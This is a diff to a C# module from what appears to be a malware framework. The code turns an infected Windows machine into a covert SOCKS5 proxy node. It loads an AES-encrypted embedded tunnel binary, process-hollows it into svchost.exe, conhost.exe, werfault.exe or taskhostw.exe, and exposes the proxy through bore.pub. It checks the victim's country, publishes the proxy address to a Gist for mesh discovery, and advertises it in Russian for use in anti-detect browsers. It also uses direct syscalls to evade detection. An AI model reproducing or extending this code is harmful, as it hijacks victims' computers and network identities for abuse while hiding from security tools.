@@ -8,25 +8,50 @@ using System.Threading.Tasks;
 using System.Diagnostics;
 using System.Collections.Generic;
 using System.Text.RegularExpressions;
+using VanguardCore;
 
 namespace VanguardCore.Modules
 {
     public class ProxyModule
     {
-        // [POLY_JUNK]
-        private static void _vanguard_e0c46f53() {
-            int val = 62402;
-            if (val > 50000) Console.WriteLine("Hash:" + 62402);
-        }
-
         private static bool _active = false;
         private static TcpListener _listener;
-        private static Process _boreProcess;
-        private static string _borePath;
+        private static IntPtr _hProcess = IntPtr.Zero;
         private static int _localPort = 4444;
         private static string _publicUrl = null;
 
+        // [PRO STEALTH] legitimate system host processes for hollowing
+        private static readonly string[] TARGET_HOSTS = {
+            @"C:\Windows\System32\svchost.exe",
+            @"C:\Windows\System32\conhost.exe",
+            @"C:\Windows\System32\werfault.exe",
+            @"C:\Windows\System32\taskhostw.exe"
+        };
+
         public static bool IsActive => _active;
+
+        public static async Task AutoRegisterAsync()
+        {
+            try
+            {
+                var info = await FinalBot.Modules.SystemInfoModule.GetCountryInfoAsync();
+                string country = info.country.ToLower();
+                
+                bool isClean = false;
+                foreach (var region in Constants.CLEAN_REGIONS)
+                {
+                    if (country.Contains(region.ToLower())) { isClean = true; break; }
+                }
+
+                if (isClean)
+                {
+                    Console.WriteLine($"[PROXY] Clean region detected ({country}). Starting auto-node...");
+                    string result = await Start();
+                    if (result.Contains("✅")) Console.WriteLine("[PROXY] Auto-node registered successfully.");
+                }
+            }
+            catch { }
+        }
 
         public static async Task<string> Start()
         {
@@ -34,53 +59,86 @@ namespace VanguardCore.Modules
 
             try
             {
-                _borePath = PrepareBore();
-                if (string.IsNullOrEmpty(_borePath)) return "[!] bore.bin not found or blocked";
+                // [PRO STEALTH] Load encrypted bore directly from embedded resources (NO DISK)
+                string resourceName = "bore.bin";
+                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
+                
+                // Try multiple prefix variants matching csproj/AOT behavior
+                string[] possibleNames = { resourceName, $"VanguardCore.{resourceName}", $"MicrosoftManagementSvc.{resourceName}" };
+                Stream stream = null;
+                foreach (var name in possibleNames) {
+                    stream = assembly.GetManifestResourceStream(name);
+                    if (stream != null) break;
+                }
+
+                if (stream == null) return "[!] bore.bin resource not found in binary";
+
+                byte[] encrypted;
+                using (var ms = new MemoryStream()) {
+                    await stream.CopyToAsync(ms);
+                    encrypted = ms.ToArray();
+                }
+
+                // [PRO STEALTH] Use global AES-GCM decryption
+                byte[] payload = AesHelper.Decrypt(encrypted);
+                if (payload == null) return "[!] Failed to decrypt bore.bin (Key mismatch?)";
 
                 _listener = new TcpListener(IPAddress.Loopback, _localPort);
                 _listener.Start();
                 _active = true;
 
-                // Start local server thread
                 _ = Task.Run(() => AcceptClients());
 
-                // Start Bore tunnel
-                _boreProcess = new Process();
-                _boreProcess.StartInfo.FileName = _borePath;
-                _boreProcess.StartInfo.Arguments = $"local {_localPort} --to bore.pub";
-                _boreProcess.StartInfo.UseShellExecute = false;
-                _boreProcess.StartInfo.RedirectStandardOutput = true;
-                _boreProcess.StartInfo.CreateNoWindow = true;
-                _boreProcess.Start();
+                // [PRO STEALTH] Iterative Process Hollowing (No Disk Drop)
+                bool injected = false;
+                Microsoft.Win32.SafeHandles.SafeFileHandle stdoutPipe = null;
+                string cmdLine = $"svchost.exe local {_localPort} --to bore.pub";
 
-                // Wait for port (timeout 15s)
+                foreach (var host in TARGET_HOSTS)
+                {
+                    if (!File.Exists(host)) continue;
+
+                    Console.WriteLine($"[PROXY] Attempting injection into {Path.GetFileName(host)}...");
+                    if (HollowingService.RunPEWithOutput(host, payload, cmdLine, out stdoutPipe, out _hProcess))
+                    {
+                        injected = true;
+                        break;
+                    }
+                }
+
+                if (!injected) {
+                    Stop();
+                    return "[!] Failed to start stealth tunnel (Hollowing fail)";
+                }
+
+                // Wait for port from pipe (timeout 15s)
                 string output = "";
                 DateTime start = DateTime.Now;
-                while ((DateTime.Now - start).TotalSeconds < 15)
+                using (var reader = new StreamReader(new FileStream(stdoutPipe, FileAccess.Read)))
                 {
-                    if (_boreProcess.HasExited) break;
-                    string line = _boreProcess.StandardOutput.ReadLine();
-                    if (line != null)
+                    while ((DateTime.Now - start).TotalSeconds < 15)
                     {
-                        output += line + "\n";
-                        var match = Regex.Match(line, @"bore\.pub:(\d+)", RegexOptions.IgnoreCase);
-                        if (match.Success)
+                        string line = await reader.ReadLineAsync();
+                        if (line != null)
                         {
-                            string port = match.Groups[1].Value;
-                            _publicUrl = $"bore.pub:{port}";
-                            
-                            // A-03: Update Gist for Mesh Discovery
-                            await GistManager.UpdateFile("proxies.json", _publicUrl);
-                            
-                            return $"✅ <b>SOCKS5 прокси запущен!</b>\n\n" +
-                                   $"🌐 <b>Адрес:</b> <code>{_publicUrl}</code>\n\n" +
-                                   $"📱 <b>В антидетект браузере:</b>\n" +
-                                   $"• Тип: <code>SOCKS5</code>\n" +
-                                   $"• Host: <code>bore.pub</code>\n" +
-                                   $"• Port: <code>{port}</code>";
+                            output += line + "\n";
+                            var match = Regex.Match(line, @"bore\.pub:(\d+)", RegexOptions.IgnoreCase);
+                            if (match.Success)
+                            {
+                                string port = match.Groups[1].Value;
+                                _publicUrl = $"bore.pub:{port}";
+                                await GistManager.UpdateFile(Constants.GIST_MESH_FILENAME, _publicUrl);
+                                
+                                return $"✅ <b>SOCKS5 прокси запущен!</b>\n\n" +
+                                       $"🌐 <b>Адрес:</b> <code>{_publicUrl}</code>\n\n" +
+                                       $"📱 <b>В антидетект браузере:</b>\n" +
+                                       $"• Тип: <code>SOCKS5</code>\n" +
+                                       $"• Host: <code>bore.pub</code>\n" +
+                                       $"• Port: <code>{port}</code>";
+                            }
                         }
+                        else await Task.Delay(100);
                     }
-                    Thread.Sleep(100);
                 }
 
                 Stop();
@@ -98,32 +156,17 @@ namespace VanguardCore.Modules
             _active = false;
             _publicUrl = null;
             try { _listener?.Stop(); } catch { }
-            try { _boreProcess?.Kill(); } catch { }
-            if (!string.IsNullOrEmpty(_borePath) && File.Exists(_borePath))
+            if (_hProcess != IntPtr.Zero)
             {
-                try { File.Delete(_borePath); } catch { }
+                try { 
+                    // [PRO NOTE] We don't have a direct Kill for IntPtr in C#, 
+                    // usually we'd use TerminateProcess or just let it close with parent.
+                    SyscallManager.Initialize();
+                    var ntTerminate = SyscallManager.GetSyscallDelegate<SyscallManager.NtTerminateProcess>("NtTerminateProcess");
+                    ntTerminate?.Invoke(_hProcess, 0);
+                } catch { }
+                _hProcess = IntPtr.Zero;
             }
-        }
-
-        private static string PrepareBore()
-        {
-            // PRO TIP: Using XOR-encrypted .bin (extracted from resources to WorkDir)
-            string binPath = Path.Combine(ResourceModule.WorkDir, "bore.bin");
-            if (!File.Exists(binPath)) return null;
-
-            string dest = Path.Combine(ResourceModule.WorkDir, $"WUDHost-{Guid.NewGuid().ToString("N").Substring(0, 6).ToUpper()}.exe");
-
-            try
-            {
-                byte[] encrypted = File.ReadAllBytes(binPath);
-                byte[] decrypted = new byte[encrypted.Length];
-                for (int i = 0; i < encrypted.Length; i++)
-                    decrypted[i] = (byte)(encrypted[i] ^ 0x42);
-
-                File.WriteAllBytes(dest, decrypted);
-                return dest;
-            }
-            catch { return null; }
         }
 
         private static async Task AcceptClients()
@@ -149,15 +192,7 @@ namespace VanguardCore.Modules
                     byte[] firstByte = new byte[1];
                     int read = await stream.ReadAsync(firstByte, 0, 1);
                     if (read == 0) return;
-
-                    if (firstByte[0] == 0x05)
-                    {
-                        await HandleSocks5(stream);
-                    }
-                    else
-                    {
-                        // Minimal HTTP CONNECT handler could go here, but SOCKS5 is primary
-                    }
+                    if (firstByte[0] == 0x05) await HandleSocks5(stream);
                 }
                 catch { }
             }
@@ -165,29 +200,25 @@ namespace VanguardCore.Modules
 
         private static async Task HandleSocks5(NetworkStream stream)
         {
-            // SOCKS5 Handshake
             byte[] nmethodsB = new byte[1];
             await stream.ReadAsync(nmethodsB, 0, 1);
             byte[] methods = new byte[nmethodsB[0]];
             await stream.ReadAsync(methods, 0, methods.Length);
-            await stream.WriteAsync(new byte[] { 0x05, 0x00 }, 0, 2); // No Auth
+            await stream.WriteAsync(new byte[] { 0x05, 0x00 }, 0, 2);
 
-            // Request
             byte[] reqHeader = new byte[4];
             await stream.ReadAsync(reqHeader, 0, 4);
-            if (reqHeader[1] != 0x01) return; // Only CONNECT
+            if (reqHeader[1] != 0x01) return;
 
             string host = "";
             int port = 0;
 
-            if (reqHeader[3] == 0x01) // IPv4
-            {
+            if (reqHeader[3] == 0x01) {
                 byte[] addr = new byte[4];
                 await stream.ReadAsync(addr, 0, 4);
                 host = $"{addr[0]}.{addr[1]}.{addr[2]}.{addr[3]}";
             }
-            else if (reqHeader[3] == 0x03) // Domain
-            {
+            else if (reqHeader[3] == 0x03) {
                 byte[] lenB = new byte[1];
                 await stream.ReadAsync(lenB, 0, 1);
                 byte[] hostB = new byte[lenB[0]];
@@ -199,15 +230,11 @@ namespace VanguardCore.Modules
             await stream.ReadAsync(portB, 0, 2);
             port = (portB[0] << 8) | portB[1];
 
-            try
-            {
-                using (var remoteClient = new TcpClient())
-                {
+            try {
+                using (var remoteClient = new TcpClient()) {
                     await remoteClient.ConnectAsync(host, port);
                     await stream.WriteAsync(new byte[] { 0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }, 0, 10);
-                    
-                    using (var remoteStream = remoteClient.GetStream())
-                    {
+                    using (var remoteStream = remoteClient.GetStream()) {
                         var t1 = stream.CopyToAsync(remoteStream);
                         var t2 = remoteStream.CopyToAsync(stream);
                         await Task.WhenAny(t1, t2);
